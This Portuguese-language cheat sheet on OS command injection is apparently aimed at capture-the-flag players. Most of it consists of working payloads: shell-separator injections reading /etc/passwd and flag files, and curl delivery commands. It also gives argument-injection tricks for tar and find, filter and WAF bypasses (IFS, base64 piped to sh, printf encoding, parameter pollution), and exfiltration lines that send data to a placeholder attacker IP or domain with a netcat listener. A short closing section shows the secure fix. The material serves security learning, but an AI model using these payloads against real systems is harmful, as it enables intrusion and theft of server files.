# OS Command Injection — Guia Completo

> Input do utilizador é passado para um comando shell. Injeta comandos adicionais para ler ficheiros ou executar código.

## CWE
- CWE-78 — OS Command Injection
- CWE-88 — Argument Injection
- CWE-426 — Untrusted Search Path

---

## Como reconhecer

A app faz algo que parece executar um comando no servidor:
- **Ping / traceroute / nslookup** (network tools)
- **Backup / compress / archive** (file operations)
- **Print / label / report** (formatação)
- **Status check / health / monitor** (system info)
- **File listing / audit / search** (filesystem)
- **Plugin / extension / custom function** (execução dinâmica)

---

## Teste rápido — injeção básica

Mete estes payloads no campo suspeito:

```bash
# Separadores de comandos (testar todos)
localhost; cat /etc/passwd
localhost | cat /etc/passwd
localhost & cat /etc/passwd
localhost && cat /etc/passwd
localhost || cat /etc/passwd

# Substituição de comando
localhost$(cat /etc/passwd)
localhost`cat /etc/passwd`
```

Se algum mostra conteúdo de `/etc/passwd` → OS injection confirmado. Depois muda para `cat /flag/flag`.

---

## ATENÇÃO: como enviar payloads com curl sem o TEU terminal estragar tudo

O teu shell (zsh/bash) interpreta `;`, `|`, `&`, `$()`, espaços e outros caracteres **antes** de os enviar ao servidor. Se não tiveres cuidado, o comando executa **localmente no teu Mac** em vez de no servidor remoto.

### Regra de ouro: URL na URL, shell no body

| Método | Como enviar `; cat /flag/flag` |
|--------|-------------------------------|
| **GET (payload na URL)** | Encodar TUDO: `%3b`, `%20`, `%7c`... |
| **POST (payload no body)** | Aspas + `-d` ou `--data-urlencode` |

### GET — payload vai na URL

**O teu terminal interpreta `;` e espaços.** Tens de URL-encodar os caracteres especiais:

| Caracter | URL-encoded |
|----------|------------|
| `;` | `%3b` |
| espaço | `%20` |
| `\|` | `%7c` |
| `&` | `%26` |
| `$` | `%24` |
| `` ` `` | `%60` |
| `(` | `%28` |
| `)` | `%29` |
| `\n` (newline) | `%0a` |
| `#` | `%23` |

```bash
# ERRADO — o teu zsh interpreta o ; e executa "cat flag" localmente!
curl -s https://target.com/cowsay/ok;cat flag.txt

# ERRADO — \ escapa no zsh mas o servidor recebe literal, não como separador
curl -s "https://target.com/cowsay/ok\;cat flag.txt"

# CORRETO — tudo URL-encoded, entre aspas
curl -s "https://target.com/cowsay/ok%3bcat%20flag.txt"

# Mais exemplos corretos:
curl -s "https://target.com/ping?host=localhost%3bcat%20/flag/flag"
curl -s "https://target.com/run?cmd=ls%7ccat%20/flag/flag"         # pipe
curl -s "https://target.com/run?cmd=ls%0acat%20/flag/flag"         # newline
curl -s "https://target.com/run?cmd=%24(cat%20/flag/flag)"         # $(...)
```

### POST — payload vai no body

Com POST é mais simples — o `-d` ou `--data-urlencode` protege-te:

```bash
# Método 1: -d com aspas (funciona para ; e espaços simples)
curl -s -X POST http://target.com/ping -d "host=localhost; cat /flag/flag"
# O -d envia o body raw, o shell não interpreta ; dentro das aspas

# Método 2: --data-urlencode (o curl encoda por ti — mais seguro)
curl -s -X POST http://target.com/ping --data-urlencode "host=localhost; cat /flag/flag"

# Método 3: para newlines e chars especiais
curl -s -X POST http://target.com/label --data-urlencode $'text=hello\ncat /flag/flag'
```

### Diagnóstico rápido: "quem está a executar o comando?"

| Sintoma | Problema |
|---------|----------|
| Vês ficheiros do TEU Mac (Desktop, Documents...) | O comando executou **localmente** — o `;` foi interpretado pelo teu shell |
| `curl: option -xxx: blank argument` | O espaço partiu o comando do curl — faltam aspas ou `%20` |
| O servidor mostra o payload como texto literal (ex: cowsay diz `ok;ls`) | O `;` chegou ao servidor mas não foi interpretado como separador — tentar `%3b` ou outro separador |
| Resposta vazia | O comando executou no servidor mas sem output — tentar redirecionar ou ver logs |

### Tabela de conversão rápida

```
Quero enviar:    localhost; cat /flag/flag
Na URL fica:     localhost%3bcat%20/flag/flag
                 localhost%3b%20cat%20/flag/flag    (com espaço antes do cat)

Quero enviar:    $(cat /flag/flag)
Na URL fica:     %24%28cat%20/flag/flag%29

Quero enviar:    ok\ncat /flag/flag    (newline)
Na URL fica:     ok%0acat%20/flag/flag

Quero enviar:    ls | cat /flag/flag
Na URL fica:     ls%7ccat%20/flag/flag
```

---

## Técnicas por situação

### 1. Separador ponto-e-vírgula (`;`)
**O mais simples.** O shell executa ambos os comandos.

```bash
curl -X POST http://TARGET/ping -d "host=localhost; cat /flag/flag"
```
Servidor executa: `ping -c 1 localhost; cat /flag/flag`

### 2. Pipe (`|`)
O output do primeiro comando vai para o segundo, mas o segundo também executa.
```bash
curl -X POST http://TARGET/ping -d "host=localhost | cat /flag/flag"
```

### 3. Substituição de comando (`$()` ou backticks)
O comando interno executa primeiro e o resultado substitui o placeholder.
```bash
curl -X POST http://TARGET/ticket -d "requester=$(cat /flag/flag)&issue=test"
```
O output de `cat` fica embutido no valor de `requester`.

**Atenção:** o resultado pode não aparecer na resposta HTTP direta — procura num **log**, num **ticket**, ou noutro endpoint:
```bash
curl http://TARGET/log
```

### 4. Newline bypass (`\n`)
**Quando há blacklist** de `; | & $ \`` mas **não filtram newlines**.

```bash
curl -X POST http://TARGET/label --data-urlencode $'text=hello\ncat /flag/flag'
```
O shell trata `\n` como separador de comandos — equivalente a `;`.

**Como enviar newline real:**
```bash
# Método 1: --data-urlencode com $'...\n...'
curl -X POST URL --data-urlencode $'field=value\ncat /flag/flag'

# Método 2: %0a no URL
curl "http://TARGET/run?cmd=ls%0acat+/flag/flag"

# Método 3: printf
printf 'text=hello\ncat /flag/flag' | curl -X POST URL -d @-
```

### 5. Glob expansion
**Quando há blacklist de paths literais** (ex: bloqueia `/flag/flag` como string) mas não de wildcards.

```bash
curl -X POST http://TARGET/audit -d "path=/flag/*"
curl -X POST http://TARGET/audit -d "path=/fl?g/fl?g"
curl -X POST http://TARGET/audit -d "path=/fla[g]/fla[g]"
```
O shell expande `/flag/*` → `/flag/flag` antes de executar.

### 6. Argument injection
**Quando o input vai como argumento**, não concatenado numa string shell.
Ex: `subprocess.run(["tar", "czf", "backup.tar.gz", user_input])`

```bash
# Injetar flags do programa em vez de comandos shell
--checkpoint=1 --checkpoint-action=exec=cat /flag/flag   # tar
-exec cat /flag/flag {} ;                                 # find
-o /dev/stdout                                            # curl
```

### 7. Second-order injection
O payload é **guardado** num passo e **executado** noutro.

```bash
# Passo 1: guardar o payload (config, nome, path, etc.)
curl -X POST http://TARGET/config -d "logdir=/tmp/logs; cat /flag/flag"

# Passo 2: trigger a execução (shipper, cron, backup, etc.)
curl -X POST http://TARGET/ship
```
Dica: se o primeiro endpoint não mostra nada, procura um segundo endpoint que **usa** o valor guardado.

### 8. PATH override / shadowing
Se a app executa um comando por nome (sem path absoluto) e permite upload:

```bash
# Upload script com o mesmo nome
curl -X POST http://TARGET/plugins \
  --data-urlencode 'name=sysdiag' \
  --data-urlencode $'script=#!/bin/sh\ncat /flag/flag'

# A app tem o diretório de plugins no PATH antes do /usr/bin
# Quando executa "sysdiag", corre o TEU script
curl -X POST http://TARGET/run -d "tool=sysdiag"
```

### 9. Output indireto
Quando a resposta HTTP não mostra o output do comando:

```bash
# 1. Output no log
curl -X POST http://TARGET/ticket -d "requester=\$(cat /flag/flag)&issue=x"
curl http://TARGET/log    # flag aqui!

# 2. Output num ficheiro acessível
curl -X POST http://TARGET/run -d "cmd=cat /flag/flag > /app/static/out.txt"
curl http://TARGET/static/out.txt

# 3. Exfiltração via HTTP
curl -X POST http://TARGET/run -d "cmd=curl http://TEU_IP:9900/\$(cat /flag/flag)"
# No teu servidor: nc -lp 9900

# 4. DNS exfiltration
curl -X POST http://TARGET/run -d "cmd=nslookup \$(cat /flag/flag).TEU_DOMINIO.com"
```

---

## Bypasses de filtros

### Espaços bloqueados
```bash
cat${IFS}/flag/flag          # $IFS = space/tab/newline
cat</flag/flag               # input redirection
{cat,/flag/flag}             # brace expansion
cat$'\x20'/flag/flag         # hex space
```

### Palavras bloqueadas (ex: "cat", "flag")
```bash
# Concatenação
c'a't /flag/flag             # quotes vazias
c\at /flag/flag              # backslash
c""at /flag/flag             # double quotes vazias

# Variável
a=ca;b=t;$a$b /flag/flag

# Base64
echo Y2F0IC9mbGFnL2ZsYWc= | base64 -d | sh

# Octal via printf
$(printf '\143\141\164 /\146\154\141\147/\146\154\141\147')

# Hex via printf
$(printf '\x63\x61\x74 /\x66\x6c\x61\x67/\x66\x6c\x61\x67')

# Wildcards
/bin/c?t /fla?/fla?
/bin/ca* /fla*/fla*

# Alternativas ao cat
head /flag/flag
tail /flag/flag
less /flag/flag
more /flag/flag
tac /flag/flag
rev /flag/flag | rev
sort /flag/flag
nl /flag/flag
xxd /flag/flag
base64 /flag/flag
dd if=/flag/flag
```

### Path absoluto bloqueado
```bash
cd /flag && cat flag
cat /fla?/fla?
cat /flag/*
```

### Double encoding (WAF na frente)
```bash
# ; = %3b → %253b (double-encoded)
curl "http://TARGET/run?cmd=ls%253bcat+/flag/flag"
```

### HTTP Parameter Pollution (HPP)
```bash
# WAF vê o primeiro cmd, app usa o último
curl "http://TARGET/run?cmd=ls&cmd=ls;cat+/flag/flag"
```

---

## Árvore de decisão

```
Input vai para comando shell?
├── SIM, com shell=True ou system()
│   ├── Sem filtro → ; cat /flag/flag
│   ├── Blacklist de ; | & $ ` → \n (newline)
│   ├── Blacklist de paths → globs (/flag/*)
│   ├── Blacklist de palavras → c'a't, printf, base64
│   └── WAF na frente → double encoding, HPP
│
├── SIM, como argumento (lista)
│   └── Argument injection (--checkpoint, -exec)
│
├── O payload é GUARDADO, não executado agora
│   └── Second-order: guardar + trigger noutro endpoint
│
└── Upload de scripts/plugins
    └── PATH override: shadowing de comandos
```

---

## Fix correto

```python
# ERRADO — shell=True com input
os.system(f"ping -c 1 {host}")
subprocess.run(f"ping -c 1 {host}", shell=True)

# CORRETO — lista de argumentos, sem shell
subprocess.run(["ping", "-c", "1", host])

# Se shell=True é inevitável — shlex.quote
import shlex
subprocess.run(f"ping -c 1 {shlex.quote(host)}", shell=True)

# Validação de input — whitelist
import re
if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
    abort(400, "Invalid hostname")
```

**Princípio:** nunca passar input do utilizador para o shell. Usar listas de argumentos ou APIs nativas (ex: `socket.gethostbyname()` em vez de `nslookup`).
